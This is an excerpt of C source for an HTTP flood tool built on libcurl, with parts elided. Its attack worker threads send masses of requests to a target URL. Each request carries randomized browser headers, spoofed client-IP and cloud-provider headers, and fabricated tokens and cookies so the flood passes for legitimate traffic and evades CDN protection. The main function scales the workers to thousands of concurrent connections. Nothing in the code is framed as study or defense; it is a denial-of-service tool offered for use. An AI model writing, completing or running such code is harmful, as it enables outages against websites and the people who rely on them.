...
#define MAX_CONNECTIONS_PER_WORKER 10
#define MAX_TOTAL_WORKERS 32000
...
typedef struct {
    ...
    CURL *curls[MAX_CONNECTIONS_PER_WORKER];
    CURLSH *share;
} WorkerArgs;
...
// ========== libcurl Attack Worker ==========

size_t header_callback(char *buffer, size_t size, size_t nitems, void *userdata) {
    return size * nitems;
}

void setup_curl_headers(CURL *curl, const char *host, const char *mode, char *full_url) {
    ...
    snprintf(header_str, sizeof(header_str), "User-Agent: %s", random_ua());
    headers = curl_slist_append(headers, header_str);
    
    snprintf(header_str, sizeof(header_str), "Referer: %s", random_referer());
    headers = curl_slist_append(headers, header_str);
    
    snprintf(header_str, sizeof(header_str), "Accept: %s", accept_headers[rand_int(0, ACCEPT_HEADERS_COUNT - 1)]);
    headers = curl_slist_append(headers, header_str);
    
    snprintf(header_str, sizeof(header_str), "Accept-Language: %s", accept_languages[rand_int(0, ACCEPT_LANGS_COUNT - 1)]);
    headers = curl_slist_append(headers, header_str);
    
    snprintf(header_str, sizeof(header_str), "Accept-Encoding: %s", accept_encodings[rand_int(0, ACCEPT_ENCODINGS_COUNT - 1)]);
    headers = curl_slist_append(headers, header_str);
    
    snprintf(header_str, sizeof(header_str), "Cache-Control: %s", cache_controls[rand_int(0, CACHE_CONTROLS_COUNT - 1)]);
    headers = curl_slist_append(headers, header_str);
        ...
        for (int i = 0; i < numCF; i++) {
            ...
            if (strlen(h.value) == 0) {
                if (strcmp(h.key, "CF-Connecting-IP") == 0 || strcmp(h.key, "True-Client-IP") == 0) {
                    snprintf(header_str, sizeof(header_str), "%s: %s", h.key, cf_ip);
                    headers = curl_slist_append(headers, header_str);
                }
            } else {
                snprintf(header_str, sizeof(header_str), "%s: %s", h.key, h.value);
                headers = curl_slist_append(headers, header_str);
            }
        }
        snprintf(header_str, sizeof(header_str), "X-Forwarded-For: %s", cf_ip);
        headers = curl_slist_append(headers, header_str);
        snprintf(header_str, sizeof(header_str), "X-Real-IP: %s", cf_ip);
        headers = curl_slist_append(headers, header_str);
        free(cf_ip);
    }
    ...
    if (strcmp(provider, "hetzner") == 0 && rand_bool()) {
        for (int i = 0; i < HETZNER_HEADERS_COUNT; i++) {
            ...
            if (strlen(h.value) == 0) {
                ...
                snprintf(header_str, sizeof(header_str), "%s: %s", h.key, ip);
                headers = curl_slist_append(headers, header_str);
                free(ip);
            } else {
                snprintf(header_str, sizeof(header_str), "%s: %s", h.key, h.value);
    ...
    if (strcmp(provider, "digitalocean") == 0 && rand_bool()) {
        for (int i = 0; i < DIGITALOCEAN_HEADERS_COUNT; i++) {
            ...
            if (strcmp(h.key, "X-Forwarded-Host") == 0 && strlen(h.value) == 0) {
                snprintf(header_str, sizeof(header_str), "%s: %s", h.key, host);
                headers = curl_slist_append(headers, header_str);
    ...
    if (strcmp(provider, "aws") == 0 && rand_bool()) {
        for (int i = 0; i < AWS_HEADERS_COUNT; i++) {
            ...
            if (strcmp(h.key, "X-Amz-Cf-Id") == 0 && strlen(h.value) == 0) {
                ...
                snprintf(header_str, sizeof(header_str), "%s: %s", h.key, hex);
                headers = curl_slist_append(headers, header_str);
                free(hex);
            } else {
                snprintf(header_str, sizeof(header_str), "%s: %s", h.key, h.value);
        ...
        for (int i = 0; i < numApp; i++) {
            ...
            if (strlen(h.value) == 0) {
                if (strcmp(h.key, "X-CSRF-Token") == 0) {
                    ...
                    snprintf(header_str, sizeof(header_str), "%s: %s", h.key, token);
                    headers = curl_slist_append(headers, header_str);
                    free(token);
                } else if (strcmp(h.key, "Authorization") == 0) {
                    char *token = random_base64(48);
                    snprintf(header_str, sizeof(header_str), "%s: Bearer %s", h.key, token);
                    headers = curl_slist_append(headers, header_str);
                    free(token);
                } else if (strcmp(h.key, "X-API-Key") == 0) {
                    char *key = random_hex(16);
                    snprintf(header_str, sizeof(header_str), "%s: %s", h.key, key);
                    headers = curl_slist_append(headers, header_str);
                    free(key);
                } else if (strcmp(h.key, "X-Device-ID") == 0) {
                    char *uuid = generate_uuid();
                    snprintf(header_str, sizeof(header_str), "%s: %s", h.key, uuid);
                    headers = curl_slist_append(headers, header_str);
                    free(uuid);
                } else if (strcmp(h.key, "X-Session-ID") == 0) {
                    char *sid = random_hex(32);
                    snprintf(header_str, sizeof(header_str), "%s: %s", h.key, sid);
                    headers = curl_slist_append(headers, header_str);
                    free(sid);
                }
            } else {
    ...
    if (rand_int(1, 100) <= 70) {
        ...
        if (cookies) {
            snprintf(header_str, sizeof(header_str), "Cookie: %s", cookies);
            headers = curl_slist_append(headers, header_str);
            free(cookies);
        }
    }
    ...
    if (rand_int(1, 100) <= 15) {
        ...
        snprintf(header_str, sizeof(header_str), "Range: bytes=%d-%d", start, end);
        headers = curl_slist_append(headers, header_str);
    }
    ...
    if (rand_bool()) {
        ...
        snprintf(header_str, sizeof(header_str), "TE: %s", te_vals[rand_int(0, TE_VALUES_COUNT - 1)]);
        headers = curl_slist_append(headers, header_str);
    }
    
    // X-Forwarded-For if not set
    if (rand_int(1, 100) <= 30) {
        char *ip = generate_random_ip();
        snprintf(header_str, sizeof(header_str), "X-Forwarded-For: %s", ip);
        headers = curl_slist_append(headers, header_str);
        free(ip);
    }
...
void *attack_worker_thread(void *args) {
    ...
    // Initialize CURL handles with connection reuse
    CURL *curls[MAX_CONNECTIONS_PER_WORKER];
    for (int i = 0; i < MAX_CONNECTIONS_PER_WORKER; i++) {
        curls[i] = curl_easy_init();
        if (curls[i]) {
            curl_easy_setopt(curls[i], CURLOPT_URL, target);
            curl_easy_setopt(curls[i], CURLOPT_WRITEFUNCTION, write_callback);
            curl_easy_setopt(curls[i], CURLOPT_HEADERFUNCTION, header_callback);
            curl_easy_setopt(curls[i], CURLOPT_TIMEOUT, 10L);
            curl_easy_setopt(curls[i], CURLOPT_CONNECTTIMEOUT, 5L);
            curl_easy_setopt(curls[i], CURLOPT_FOLLOWLOCATION, 0L);
            curl_easy_setopt(curls[i], CURLOPT_SSL_VERIFYPEER, 0L);
            curl_easy_setopt(curls[i], CURLOPT_SSL_VERIFYHOST, 0L);
            curl_easy_setopt(curls[i], CURLOPT_TCP_NODELAY, 1L);
            curl_easy_setopt(curls[i], CURLOPT_FORBID_REUSE, 0L); // Enable connection reuse
            curl_easy_setopt(curls[i], CURLOPT_FRESH_CONNECT, 0L); // Don't force fresh connect
            curl_easy_setopt(curls[i], CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0); // HTTP/2
            curl_easy_setopt(curls[i], CURLOPT_PIPEWAIT, 1L); // Wait for pipelining
            curl_easy_setopt(curls[i], CURLOPT_SERVER_RESPONSE_TIMEOUT, 5L);
            
            // Enable SSL session reuse
            curl_easy_setopt(curls[i], CURLOPT_SSL_SESSIONID_CACHE, 1L);
            
            // Share data between handles
            curl_easy_setopt(curls[i], CURLOPT_SHARE, wargs->share);
        }
    }
    ...
    while (!*done) {
        CURL *curl = curls[current_curl];
        current_curl = (current_curl + 1) % MAX_CONNECTIONS_PER_WORKER;
        
        if (!curl) continue;
        
        // Generate path and URL
        ...
        // Set headers
        setup_curl_headers(curl, host, mode, full_url);
...
int main(int argc, char *argv[]) {
    ...
    // Calculate total workers based on cores
    total_workers = num_cores * WORKERS_PER_CORE;
    ...
    printf("[+] CPU Cores: %d\n", num_cores);
    printf("[+] Workers per core: %d\n", WORKERS_PER_CORE);
    printf("[+] Total Workers: %d\n", total_workers);
    printf("[+] Connections per worker: %d\n", MAX_CONNECTIONS_PER_WORKER);
    printf("[+] Total Connections: %d\n", total_workers * MAX_CONNECTIONS_PER_WORKER);
    ...
    // Create share object for SSL session reuse
    CURLSH *share = curl_share_init();
    curl_share_setopt(share, CURLSHOPT_SHARE, CURL_LOCK_DATA_SSL_SESSION);
    curl_share_setopt(share, CURLSHOPT_SHARE, CURL_LOCK_DATA_CONNECT);
    
    pthread_t *workers = malloc(total_workers * sizeof(pthread_t));
    WorkerArgs *args = malloc(total_workers * sizeof(WorkerArgs));
